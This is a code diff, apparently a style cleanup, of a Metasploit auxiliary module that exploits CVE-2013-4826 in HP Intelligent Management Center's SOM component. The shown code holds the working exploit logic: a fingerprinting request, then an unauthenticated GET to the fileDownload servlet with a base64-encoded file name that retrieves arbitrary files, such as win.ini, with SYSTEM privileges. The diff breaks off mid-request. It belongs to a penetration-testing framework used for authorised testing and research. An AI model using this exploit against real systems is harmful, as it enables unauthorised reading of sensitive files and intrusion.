@@ -9,41 +9,48 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'HP Intelligent Management SOM FileDownloadServlet Arbitrary Download',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'HP Intelligent Management SOM FileDownloadServlet Arbitrary Download',
+        'Description' => %q{
           This module exploits a lack of authentication and access control in HP Intelligent
-        Management, specifically in the FileDownloadServlet from the SOM component, in order to
-        retrieve arbitrary files with SYSTEM privileges. This module has been tested successfully
-        on HP Intelligent Management Center 5.2_E0401 with SOM 5.2 E0401 over Windows 2003 SP2.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          Management, specifically in the FileDownloadServlet from the SOM component, in order to
+          retrieve arbitrary files with SYSTEM privileges. This module has been tested successfully
+          on HP Intelligent Management Center 5.2_E0401 with SOM 5.2 E0401 over Windows 2003 SP2.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
           'juan vazquez' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2013-4826' ],
           [ 'OSVDB', '98251' ],
           [ 'BID', '62898' ],
           [ 'ZDI', '13-242' ]
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8080),
         OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc']),
         OptString.new('FILEPATH', [true, 'The path of the file to download', 'c:\\windows\\win.ini'])
-      ])
+      ]
+    )
   end
 
   def is_imc_som?
     res = send_request_cgi({
-      'uri'      => normalize_uri("servicedesk", "ServiceDesk.jsp"),
-      'method'   => 'GET'
+      'uri' => normalize_uri("servicedesk", "ServiceDesk.jsp"),
+      'method' => 'GET'
     })
 
     if res and res.code == 200 and res.body =~ /servicedesk\/servicedesk/i
@@ -58,7 +65,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     unless is_imc_som?
       vprint_error("HP iMC with the SOM component not found")
       return
@@ -66,9 +72,9 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_status("Sending request...")
     res = send_request_cgi({
-      'uri'          => normalize_uri("servicedesk", "servicedesk", "fileDownload"),
-      'method'       => 'GET',
-      'vars_get'     =>
+      'uri' => normalize_uri("servicedesk", "servicedesk", "fileDownload"),
+      'method' => 'GET',
+      'vars_get' =>
         {
           'OperType' => '2',
           'fileName' => Rex::Text.encode_base64(my_basename(datastore['FILEPATH'])),
